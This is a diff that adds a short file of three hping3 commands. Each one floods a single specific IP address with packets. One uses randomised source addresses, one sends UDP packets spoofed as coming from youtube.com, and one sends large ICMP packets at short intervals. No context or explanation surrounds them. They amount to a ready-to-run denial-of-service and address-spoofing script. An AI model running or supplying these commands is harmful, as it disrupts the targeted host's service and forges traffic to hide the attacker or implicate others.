@@ -1,0 +1,5 @@
+hping3 --count 10000 --faster --rand-source 178.128.232.201
+
+hping3 --count 9000 --udp -i u10000 --spoof youtube.com 178.128.232.201
+
+hping3 --count 11000 --icmp --data 1000 -i u7500 178.128.232.201
